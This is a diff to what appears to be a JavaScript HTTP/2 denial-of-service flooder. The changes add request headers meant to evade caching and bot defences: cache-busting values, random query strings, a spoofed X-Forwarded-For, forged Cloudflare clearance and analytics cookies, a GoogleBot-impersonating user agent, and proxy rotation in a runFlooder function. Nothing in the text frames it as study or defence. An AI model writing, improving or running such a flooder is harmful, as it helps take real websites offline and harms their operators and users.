@@ -3356,15 +3356,22 @@ headers[":authority"] = parsedTarget.host;
 headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(15);
 headers[":scheme"] = "https";
 headers["x-forwarded-proto"] = "https";
-headers["cache-control"] = "no-cache";
+headers["cache-control"] = "private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0";
 headers["X-Forwarded-For"] = spoofed;
 headers["sec-ch-ua"] = '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"';
 headers["sec-ch-ua-mobile"] = "?0";
 headers["sec-ch-ua-platform"] = "Windows";
 headers["accept-language"] = lang;
 headers["accept-encoding"] = encoding;
+headers["accept-ch"] = "Sec-CH-UA-Bitness, Sec-CH-UA-Arch, Sec-CH-UA-Full-Version, Sec-CH-UA-Mobile, Sec-CH-UA-Model, Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List, Sec-CH-UA-Platform, Sec-CH-UA, UA-Bitness, UA-Arch, UA-Full-Version, UA-Mobile, UA-Model, UA-Platform-Version, UA-Platform, UA";
+headers["critical-ch"] = "Sec-CH-UA-Bitness, Sec-CH-UA-Arch, Sec-CH-UA-Full-Version, Sec-CH-UA-Mobile, Sec-CH-UA-Model, Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List, Sec-CH-UA-Platform, Sec-CH-UA, UA-Bitness, UA-Arch, UA-Full-Version, UA-Mobile, UA-Model, UA-Platform-Version, UA-Platform, UA";
 headers["upgrade-insecure-requests"] = "1";
+headers["origin-agent-cluster"] = "?1";
+headers["cross-origin-embedder-policy"] = "require-corp";
+headers["cross-origin-opener-policy"] = "same-origin";
+headers["cross-origin-resource-policy"] = "same-origin";
 headers["accept"] = accept;
+headers["alt-svc"] = parsedTarget.host;
 headers["user-agent"] = moz + az1 + "-(GoogleBot + http://www.google.com)" + " Code:" + randstr(7);
 headers["referer"] = Ref;
 headers["sec-fetch-mode"] = "navigate"; 
@@ -3373,7 +3380,10 @@ headers["sec-fetch-user"] = "?1";
 headers["TE"] = "trailers";
 headers["cookie"] = "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15);
 headers["sec-fetch-site"] = site1;
+headers["x-content-options"] = "nosniff";
+headers["x-frame-options"] = "SAMEORIGIN";
 headers["x-requested-with"] = "XMLHttpRequest";
+
 
  function runFlooder() {
      const proxyAddr = randomElement(proxies);
